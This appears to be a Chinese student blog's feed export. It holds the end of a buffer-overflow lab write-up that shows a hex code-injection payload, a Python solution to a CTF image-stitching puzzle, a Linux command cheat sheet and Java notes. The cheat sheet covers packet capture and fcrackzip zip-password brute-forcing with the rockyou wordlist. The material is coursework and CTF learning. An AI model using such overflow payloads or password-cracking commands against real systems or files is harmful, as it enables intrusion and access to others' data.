<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/* 指令 */</span><br><span class="line">68 fa 18 40 00 48 c7 </span><br><span class="line">c7 a8 dc 61 55</span><br><span class="line">c3 </span><br><span class="line">/* 占位 */</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 </span><br><span class="line">/* 栈顶 */ </span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">/* 存放的字符串 */</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/attack_lab/1OS%25NS34C7PJ_%25%7B%253%28WYSOJ.png" alt title class>
                <p></p>
            </figure>

<p>运行后成功PASS.</p>
]]></content>
      
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> 文件系统 </tag>
            
            <tag> OS </tag>
            
            <tag> c语言 </tag>
            
            <tag> 网络 </tag>
            
            <tag> smtp </tag>
            
            <tag> Reverse </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[拼接图像]]></title>
      <url>/2019/09/25/%E6%9D%82%E7%AF%87/</url>
      <content type="html"><![CDATA[<p>null.</p>
<a id="more"></a>
<h1 id="python-拼接图像"><a href="#python-拼接图像" class="headerlink" title="python 拼接图像"></a>python 拼接图像</h1><p>在我们协会的平台上看的一道题.</p>
<p><a href="http://ctf.teamdie.club/files/45c9b42681825f26b823e44736e16a5a/d9710b4ddcbf457cb716ee5423c7f32e.zip" target="_blank" rel="noopener">附件链接</a></p>
<p>题目描述:</p>
<blockquote>
<p>[medium]<br>谁把我壁纸切了啊 ?<br>prpr~<br>请提交：flag{something}<br>来源：2019字节跳动网络安全大赛(byteCTF)</p>
</blockquote>
<p>附件里有231个小图片. 看这意思是要把它拼成一整张壁纸. <strong>PS大佬可以尝试下手动拼接, 欸嘿嘿</strong></p>
<p>对于这种图像处理的任务, 可以使用python的PIL库. 功能似乎很强大, 正在学习中…</p>
<p>我根据<code>p4ssw0rd学长</code>的一道类似题的python代码, A了这道题. </p>
<p>边看代码边分析:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path = <span class="string">"./all/"</span></span><br><span class="line"><span class="comment"># 获取文件列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_list</span><span class="params">(file_path)</span>:</span></span><br><span class="line">    dir_list = os.listdir(file_path) <span class="comment"># 未排序</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> dir_list:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># os.path.getmtime() 函数是获取文件最后修改时间</span></span><br><span class="line">        <span class="comment"># os.path.getctime() 函数是获取文件最后创建时间 </span></span><br><span class="line">        dir_list = sorted(</span><br><span class="line">            dir_list,  </span><br><span class="line">            key=<span class="keyword">lambda</span> x: os.path.getmtime(</span><br><span class="line">                os.path.join(file_path,x)</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        <span class="comment"># 这行代码比较复杂, 逐行分析</span></span><br><span class="line">        <span class="comment"># 首先sorted()是一个基本的内置的排序函数, 这里加入了参数key=lambda.</span></span><br><span class="line">        <span class="comment"># lambda是一个隐函数. 后面的x代表的是列表dir_list中的某个元素</span></span><br><span class="line">        <span class="comment"># x 本身并无实际意义, 仅仅是供表达式使用的一个名字. 类似f(x)中的x</span></span><br><span class="line">        <span class="comment"># os.path.join(file_path,x)是将两个参数以路径的格式拼接在一起</span></span><br><span class="line">        <span class="comment"># 即会适当的补全'/'. </span></span><br><span class="line">        <span class="comment"># 不过因为此处的file_path就是"./all/"</span></span><br><span class="line">        <span class="comment"># 所以这段就等效于 (file_path+x)</span></span><br><span class="line">        <span class="comment"># os.path.getmtime(os.path.join(file_path,x))) 的意义就是</span></span><br><span class="line">        <span class="comment"># 列表中每个元素(代表文件路径)对应的文件的最后修改时间</span></span><br><span class="line">        <span class="comment"># 整行代码会使dir_list中的元素按照文件最后修改时间的升序排序.</span></span><br><span class="line">        <span class="keyword">return</span> dir_list</span><br><span class="line"></span><br><span class="line">list_im = get_file_list(path)[:] </span><br><span class="line">print(list_im)</span><br><span class="line"><span class="comment"># 小图片一共有231个</span></span><br><span class="line"><span class="comment"># 231 = 3 * 7 * 11</span></span><br><span class="line"><span class="comment"># 由于要拼接的是一个壁纸, 通常宽:高约为2:1</span></span><br><span class="line"><span class="comment"># 所以猜测 宽=21(张), 高=11(张)  (猜对了~~)</span></span><br><span class="line">column = <span class="number">21</span></span><br><span class="line">row_num = <span class="number">11</span></span><br><span class="line"><span class="comment"># 所有小图片的像素的宽和高</span></span><br><span class="line">width = <span class="number">35</span></span><br><span class="line">height = <span class="number">43</span></span><br><span class="line"><span class="comment"># 将Image对象置于列表中</span></span><br><span class="line">imgs = [Image.open(path+i) <span class="keyword">for</span> i <span class="keyword">in</span> list_im]</span><br><span class="line"><span class="comment"># 建立一个Image"容器", 供我们向其中添加小图片</span></span><br><span class="line">target = Image.new(<span class="string">'RGB'</span>, (width*column, height*row_num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(</span><br><span class="line">        len(list_im)</span><br><span class="line">    ):</span><br><span class="line">    <span class="comment"># 仅当i = 0, 21, 42, 63...时执行</span></span><br><span class="line">    <span class="keyword">if</span> i % column == <span class="number">0</span>:</span><br><span class="line">        end = i + column </span><br><span class="line">        <span class="comment"># enumetate() 将可迭代的遍历的数据的下标和数据组合并返回enumerate对象</span></span><br><span class="line">        <span class="comment"># 此对象可使用for迭代遍历</span></span><br><span class="line">        <span class="comment"># 例如:  </span></span><br><span class="line">        <span class="comment"># &gt;&gt;&gt; seasons = ['Spring', 'Summer', 'Fall', 'Winter']</span></span><br><span class="line">        <span class="comment"># &gt;&gt;&gt; list(enumerate(seasons))</span></span><br><span class="line">        <span class="comment"># [(0, 'Spring'), (1, 'Summer'), (2, 'Fall'), (3, 'Winter')]</span></span><br><span class="line">        <span class="keyword">for</span> col, image <span class="keyword">in</span> enumerate(imgs[i:i+column]):</span><br><span class="line">            target.paste(</span><br><span class="line">                image, </span><br><span class="line">                <span class="comment"># 此处第二个参数, 为代表粘贴到的位置的左上角和右下角的坐标</span></span><br><span class="line">                (</span><br><span class="line">                    width*col, <span class="comment"># 左上 x </span></span><br><span class="line">                    height*(i//column), <span class="comment"># 左上 y </span></span><br><span class="line">                    width*(col + <span class="number">1</span>), <span class="comment"># 右下 x</span></span><br><span class="line">                    height*(i//column + <span class="number">1</span>) <span class="comment"># 右下 y</span></span><br><span class="line">                )</span><br><span class="line">            )   </span><br><span class="line"><span class="comment"># 在Windows下此函数可直接打开生成的图片并显示</span></span><br><span class="line">target.show()</span><br></pre></td></tr></table></figure>

<p><del>啊, 我写的注释竟然比代码行数多了.</del></p>
<p>over.</p>
]]></content>
      
        
        <tags>
            
            <tag> misc </tag>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux 常用命令]]></title>
      <url>/2019/09/18/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/</url>
      <content type="html"><![CDATA[<p>原《服务器运维》.</p>
<a id="more"></a>
<p>这两天操作系统课正在教怎么用linux命令, 我也顺便把这篇博客重新写写.</p>
<h1 id="linux-常用命令"><a href="#linux-常用命令" class="headerlink" title="linux 常用命令"></a>linux 常用命令</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ul>
<li><p>新建文件 <code>touch &lt;name&gt;</code></p>
</li>
<li><p>删除文件 <code>rm   &lt;name&gt;</code></p>
</li>
<li><p>删除目录 <code>rm -r   &lt;name&gt;</code></p>
</li>
<li><p>解压缩 <code>unzip  &lt;name&gt;</code></p>
</li>
<li><p>文件复制 <code>cp 源文件 目标目录</code></p>
</li>
<li><p>文件移动 <code>mv 源文件 目标目录</code></p>
</li>
<li><p>查找文件</p>
<ol>
<li><code>find -name &#39;filename&#39;</code> 任意目录查询 </li>
<li><code>which filename</code> 从系统环境变量查询<br>因为命令在本质上讲就是文件, 所以这个命令更适合查询 某条命令调用的是哪个文件.</li>
<li><code>whatis</code> 用一句话描述某条命令的作用</li>
</ol>
</li>
<li><p>读取文件:</p>
<ol>
<li><code>cat filename</code><br>直接把文件内容全部输出</li>
<li><code>tail -n  10  filename</code><br>可以从文件的末尾向前读取.</li>
<li><code>less filename</code><br>和 more 这个命令很像, 都是分页读取, 适合那种大文件.<br>但是感觉less更顺手一些<br>空格: 向后翻一页, b: 向前翻一页, q: 退出, /‘txt’: 在文件中查找’txt’ </li>
<li><code>od filename</code><br>显示二进制数据, 可以加入参数<code>-h</code>以十六进制显示.</li>
</ol>
</li>
<li><p><code>tree [目录路径]</code> 以目录树的格式打印出某个目录的内容. </p>
</li>
</ul>
<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>过滤出文件中包含 <code>key</code>的记录 :<br><code>grep &#39;key&#39; &lt;file&gt;</code><br>递归过滤 :<br><code>grep -r &#39;key&#39; &lt;file&gt;</code></p>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>作用 |将上一个命令的输出作为下一个命令的输入, 操作符是 |</p>
<ol>
<li>将 cat 和 grep 组合在一起<br><code>cat &lt;file&gt; | grep &#39;key&#39;</code></li>
<li>过滤出目录中名字包含<code>key</code>的目录(不包含子目录)<br><code>ls | grep &#39;key&#39;</code></li>
</ol>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><ul>
<li>显示所有进程<br><code>ps -A</code></li>
<li>杀死某项进程<br><code>sudo kill [进程编号]</code></li>
<li>杀死某个用户的所有进程<br><code>sudo killall -u user</code></li>
</ul>
<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><ul>
<li><p><code>who</code></p>
<ul>
<li>第一列显示用户名称</li>
<li>第二列显示用户连接方式. Tty为直接连接, pts为远程登录</li>
<li>第三列和第四列分别为日期和时间</li>
<li>第五列登录IP地址</li>
</ul>
</li>
<li><p><code>whoami</code> 显示当前”操作用户”的用户名 </p>
</li>
<li><p><code>who am i</code> 显示”登录用户”的用户名 , 相当于<code>who -m</code></p>
</li>
<li><p><code>id</code> 显示用户以及所属群组的实际与有效ID</p>
</li>
</ul>
<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><h4 id="查看文件权限"><a href="#查看文件权限" class="headerlink" title="查看文件权限"></a>查看文件权限</h4><p>通过 <code>ls -al</code> 可以查看当前目录下的文件的权限.<br><code>drwxrw-rwx</code></p>
<table>
<thead>
<tr>
<th align="center">d</th>
<th align="center">rwx</th>
<th align="center">rw-</th>
<th align="center">rwx</th>
</tr>
</thead>
<tbody><tr>
<td align="center">是目录</td>
<td align="center">owner</td>
<td align="center">group</td>
<td align="center">other</td>
</tr>
</tbody></table>
<p>后面的r表示可读, w表示可写, x表示可执行.</p>
<h4 id="设置权限"><a href="#设置权限" class="headerlink" title="设置权限"></a>设置权限</h4><p><code>chmod 700 filename</code></p>
<p>其中 700 是二进制表示 <code>111 000 000</code></p>
<p>和上面的文件权限逐位对应.</p>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul>
<li>硬链接<br><code>ln targetFile linkedFile</code></li>
<li>符号链接<br><code>ln -s targetFile symLinkFile</code></li>
</ul>
<h2 id="编译-or-运行代码"><a href="#编译-or-运行代码" class="headerlink" title="编译 or 运行代码"></a>编译 or 运行代码</h2><h3 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h3><p>编译C++程序(指定名称和后缀):</p>
<p><code>g++   *.cpp   -std=c++11 -o  a.exe</code></p>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>可以使用 <code>php filename.php</code> 直接运行.</p>
<p>也可以放进web目录下, 通过浏览器访问启动, </p>
<p>各有各的用途.</p>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p><strong>需要注意下python版本, 通常python指3.x 而 python2指2.x</strong></p>
<ol>
<li><code>python filename.py</code></li>
<li><code>python -c &quot;your code&quot;</code></li>
</ol>
<h2 id="服务器相关"><a href="#服务器相关" class="headerlink" title="服务器相关"></a>服务器相关</h2><h3 id="pscp"><a href="#pscp" class="headerlink" title="pscp"></a>pscp</h3><p>当使用ssh远程登录云主机后, 虽然我们有了可以输入命令的bash, 但是如果要上传文件需要使用工具pscp.</p>
<p>步骤:</p>
<ol>
<li>从本地打开<code>CMD</code>到(pscp)putty目录下</li>
<li>pscp</li>
<li>基本命令格式|<br><code>pscp   [本地文件路径]   [用户名]@[ServerIP]:[目录]</code><br>或<code>pscp  -r   [本地目录路径]  [用户名]@[ServerIP]|[目录]</code><br>同理，pscp也可以从Linux向Windows复制文件或目录</li>
</ol>
<p><strong>更推荐使用 finalShell 类的工具,非常方便,省去打命令的时间,且更直观</strong></p>
<h3 id="apache服务"><a href="#apache服务" class="headerlink" title="apache服务"></a>apache服务</h3><h4 id="启动-停止-重启"><a href="#启动-停止-重启" class="headerlink" title="启动|停止|重启:"></a>启动|停止|重启:</h4><p><code>service apache2 start|stop|restart</code></p>
<h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p><code>/etc/apache2/apache2.conf</code></p>
<h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h4 id="启动-停止-重启-1"><a href="#启动-停止-重启-1" class="headerlink" title="启动|停止|重启"></a>启动|停止|重启</h4><p><code>servive mysql start|stop|restart</code></p>
<h3 id="screen命令"><a href="#screen命令" class="headerlink" title="screen命令"></a>screen命令</h3><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>screen -S &lt;name&gt;</code></td>
<td align="left">创建名为 name 的session</td>
</tr>
<tr>
<td align="left"><code>screen  -ls</code></td>
<td align="left">显示所有session</td>
</tr>
<tr>
<td align="left"><code>screen  -r  &lt;name&gt;</code></td>
<td align="left">进入名为 name 的session</td>
</tr>
<tr>
<td align="left"><code>screen   -D  -r  &lt;name&gt;</code></td>
<td align="left">将名为name的session离线并重新连接</td>
</tr>
<tr>
<td align="left"><code>ctrl+a     c</code></td>
<td align="left">在当前终端新建window</td>
</tr>
<tr>
<td align="left"><code>ctrl+a     w</code></td>
<td align="left">显示当前终端window列表</td>
</tr>
<tr>
<td align="left"><code>ctrl+a     k</code></td>
<td align="left">关闭当前window</td>
</tr>
<tr>
<td align="left"><code>ctrl+a     0-9</code></td>
<td align="left">显示0-9 window</td>
</tr>
<tr>
<td align="left"><code>ctrl+a     space</code></td>
<td align="left">按照顺序显示下一个window</td>
</tr>
<tr>
<td align="left"><code>ctrl+a     A</code></td>
<td align="left">为当前window命名</td>
</tr>
</tbody></table>
<ul>
<li>注意<code>session</code>和<code>window</code>的区别, 一个<code>session</code>可以有多个<code>window</code></li>
<li><code>screen   -D  -r  &lt;name&gt;</code>可解决某些情况下无法重连接终端的问题</li>
<li>若要关闭某个session，则关闭该session下所有window即可</li>
</ul>
<h2 id="一些命令行工具的使用"><a href="#一些命令行工具的使用" class="headerlink" title="一些命令行工具的使用"></a>一些命令行工具的使用</h2><h3 id="vim-文本编辑器"><a href="#vim-文本编辑器" class="headerlink" title="vim 文本编辑器"></a>vim 文本编辑器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim filename</span><br></pre></td></tr></table></figure>

<p>vim文本编辑器拥有命令模式和编辑模式. 只有命令模式可以输入命令, 只有编辑模式可以编辑文本.<br>以下是命令模式下的某些命令.</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">i</td>
<td align="left">在当前字符前插入文本，进入插入模式</td>
</tr>
<tr>
<td align="left">Esc</td>
<td align="left">从编辑模式切换到命令模式</td>
</tr>
<tr>
<td align="left">wq</td>
<td align="left">在命令模式下，执行存盘退出操作</td>
</tr>
<tr>
<td align="left">w</td>
<td align="left">在命令模式下，执行存盘操作</td>
</tr>
<tr>
<td align="left">w!</td>
<td align="left">在命令模式下，执行强制存盘操作</td>
</tr>
<tr>
<td align="left">q</td>
<td align="left">在命令模式下，执行退出vi操作</td>
</tr>
<tr>
<td align="left">q!</td>
<td align="left">在命令模式下，执行强制退出vi操作</td>
</tr>
</tbody></table>
<h3 id="tshark-使用"><a href="#tshark-使用" class="headerlink" title="tshark 使用"></a>tshark 使用</h3><p>抓包的工具.<br><strong>基本每个命令都需要root权限<code>sudo</code></strong></p>
<ul>
<li><p>显示可用网卡 <code>tshark -D</code></p>
</li>
<li><p>抓包  使用命令 </p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark  -c [数字]  -w [文件名.pcap] -f [捕获过滤器]</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>-c 表示抓多少包后停止</li>
<li>-w 把抓包结果输入到文件中, 无需提前创建, 若目录下没有, 自动创建</li>
<li>-f 设置捕获过滤器, 我们此处主要针对http的数据包, 所以参数设定为 “port 80”</li>
</ul>
<p>但是根据我的试验, 凡是使用tshark后产生的文件权限都十分敏感, 没法用finalshell 直接下载, 为了方便起见, 再补充使用 <code>tcpdump</code> 的方法.</p>
<ul>
<li>抓包 :  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -s  [数字]  -w [文件.pcap] port [端口数]</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>-s 表示一个包截断的长度, 0表示不截断, 完整的保存下来</li>
<li>-w 输入到文件</li>
<li>port 监听的端口</li>
</ul>
<p><strong>使用 tcpdump 同样需要sudo</strong></p>
<h3 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h3><p>一款kali下预装的好用的zip密码破解工具, 支持遍历爆破密码或者跑字典.</p>
<ul>
<li><p>遍历:</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -v -b -u -c a -p magicaaaa filename.zip</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数含义:</p>
<ul>
<li>-v : 详细信息</li>
<li>-b : 爆破</li>
<li>-u : 指定zip压缩格式(大概)</li>
<li>-c : 指定密码类型, 选项值 a 就是纯字符串, 1 就是纯数字, a1 就是数字和字符串混杂.</li>
<li>-p : 指定密码, magicaaaa就是前五位确定是magic了, 后面的a在这里是掩码, 表明这4位是字母.</li>
<li>filename : 要破解的压缩包的名称.  </li>
</ul>
</li>
</ul>
<ul>
<li>跑字典:  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace.zip</span><br></pre></td></tr></table></figure>


</li>
</ul>
<p>其中的rockyou.txt是个不错的密码字典, 可惜就是只符合外国人的密码习惯, 终于国内的比赛环境或是实战意义不大.</p>
<h2 id="MineCraft相关命令"><a href="#MineCraft相关命令" class="headerlink" title="MineCraft相关命令"></a>MineCraft相关命令</h2><p>说出来你可能不信, 当初我学习使用ubuntu云服务器是为了玩MineCraft哒~</p>
<ul>
<li><p>mine craft启动命令（其他jar类型的程序应该也可以如此启动）<br><code>java -Xms# -Xmx# -jar [path]/minecraft_server.[version].jar nogui</code><br><code>nogui</code>:表示不以图形界面运行,因为我的服务器是server版的,本身就没有图形界面,所以不加也可以<br><code>-Xms</code>:初始启动分配内存<br><code>-Xmx</code>:最大分配内存<br><code>path</code>:jar包所在路径<br><code>version</code>:当前MineCraft_Server版本</p>
</li>
<li><p><code>tell &lt;sb&gt; &lt;something&gt;</code>: 给sb 私信 </p>
</li>
<li><p><code>gamemode survival &lt;sb&gt;</code>:将 sb 调至 生存模式</p>
</li>
<li><p><code>gamemode create &lt;sb&gt;</code>:将sb 调至 创造模式</p>
</li>
</ul>
<p><strong>更多的关于MC的命令去百度上自己搜吧亲, 我现在不玩 MineCraft 了</strong></p>
]]></content>
      
        
        <tags>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java 常用方法总结]]></title>
      <url>/2019/09/17/Java/</url>
      <content type="html"><![CDATA[<p>划重点, 考试要考的</p>
<a id="more"></a>

<h1 id="Java-常用方法总结"><a href="#Java-常用方法总结" class="headerlink" title="Java 常用方法总结"></a>Java 常用方法总结</h1><p>看到java书上有那么多自带的方法, 感觉如果不总结就容易忘掉.</p>
<p>试试记笔记效果咋样吧.</p>
<p><del>试试就试试</del></p>
<h2 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h2><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line">Scanner input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="comment">// 读入整型</span></span><br><span class="line">input.nextInt();</span><br><span class="line"><span class="comment">// 读入浮点型</span></span><br><span class="line">input.nextFloat();</span><br><span class="line"><span class="comment">// 读入双精度浮点型</span></span><br><span class="line">input.nextDouble();</span><br><span class="line"><span class="comment">// 依此类推, 不再列举</span></span><br></pre></td></tr></table></figure>

<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><ul>
<li>输出后换行<br>  <code>System.out.println(&quot;hello world&quot;);</code></li>
<li>输出后不换行<br>  <code>System.out.print(&quot;hello world&quot;);</code></li>
<li>功能更强大, 类似C语言中的 printf()<br>  <code>System.out.printf(&quot;|%5d|&quot;,2*6); // =&gt; |   12|</code><table>
<thead>
<tr>
<th align="left">+ 格式控制符</th>
<th align="left">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%d</td>
<td align="left">整数</td>
</tr>
<tr>
<td align="left">%8d</td>
<td align="left">整数, 右对齐, 输出宽度为 8</td>
</tr>
<tr>
<td align="left">%-6d</td>
<td align="left">整数, 左对齐, 输出宽度为 6</td>
</tr>
<tr>
<td align="left">%s</td>
<td align="left">字符串同理, 只是把 d 换成 s</td>
</tr>
<tr>
<td align="left">%f</td>
<td align="left">浮点数</td>
</tr>
<tr>
<td align="left">%8f</td>
<td align="left">浮点数, 右对齐, 输出宽度为 8</td>
</tr>
<tr>
<td align="left">%.2f</td>
<td align="left">浮点数, 精确到百分位</td>
</tr>
<tr>
<td align="left">%16.3%</td>
<td align="left">浮点数, 精确到千分位, 输出宽度为 16</td>
</tr>
</tbody></table>
</li>
</ul>
<h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><ul>
<li>控制小数位<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> scale = <span class="number">3.1015926</span>; </span><br><span class="line"><span class="comment">//设定保留多少位小数的模板，如保留三位小数就是#0.000</span></span><br><span class="line">DecimalFormat fnum = <span class="keyword">new</span> DecimalFormat(<span class="string">"#0.000"</span>); </span><br><span class="line">String d=fnum.format(scale);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="字符-以下省略Character"><a href="#字符-以下省略Character" class="headerlink" title="字符 (以下省略Character.)"></a>字符 (以下省略<code>Character.</code>)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isDigit</span><span class="params">(ch)</span></span>; <span class="comment">//是数字?</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isLetter</span><span class="params">(ch)</span></span>; <span class="comment">//是字母?</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isLetterOrDigit</span><span class="params">(ch)</span></span>; <span class="comment">//是字母或数字?</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isLowerCase</span><span class="params">(ch)</span></span>; <span class="comment">//是小写?</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isUpperCase</span><span class="params">(ch)</span></span>; <span class="comment">//是大写?</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">toLowerCase</span><span class="params">(ch)</span></span>; <span class="comment">//转为小写</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">toUpperCase</span><span class="params">(ch)</span></span>; <span class="comment">//转为大写</span></span><br></pre></td></tr></table></figure>

<h3 id="字符串-以下省略String"><a href="#字符串-以下省略String" class="headerlink" title="字符串(以下省略String.)"></a>字符串(以下省略<code>String.</code>)</h3><h4 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">length()</span><br><span class="line">charAt(index) <span class="comment">//返回字符串中第index位的字符, 类似 string[index]</span></span><br><span class="line">toUpperCase()  <span class="comment">//全部大写</span></span><br><span class="line">toLowerCase()</span><br><span class="line">trim() <span class="comment">//去除两端空格</span></span><br><span class="line">indexOf(<span class="keyword">char</span> parm) <span class="comment">//返回字符串中 parm 第一次出现的位置</span></span><br><span class="line">indexOf(string parm)</span><br><span class="line">substring(<span class="keyword">int</span> startIndex) <span class="comment">//返回index到结束的字串</span></span><br><span class="line">substring(<span class="keyword">int</span> startIndex, <span class="keyword">int</span> endIndex)  <span class="comment">//返回中间的字符串, 不包括终点.</span></span><br></pre></td></tr></table></figure>

<h4 id="修改某几位的字符串"><a href="#修改某几位的字符串" class="headerlink" title="修改某几位的字符串"></a>修改某几位的字符串</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 变量同上面</span></span><br><span class="line">sb.replace(<span class="number">2</span>,<span class="number">4</span>,<span class="string">"bc"</span>);</span><br></pre></td></tr></table></figure>

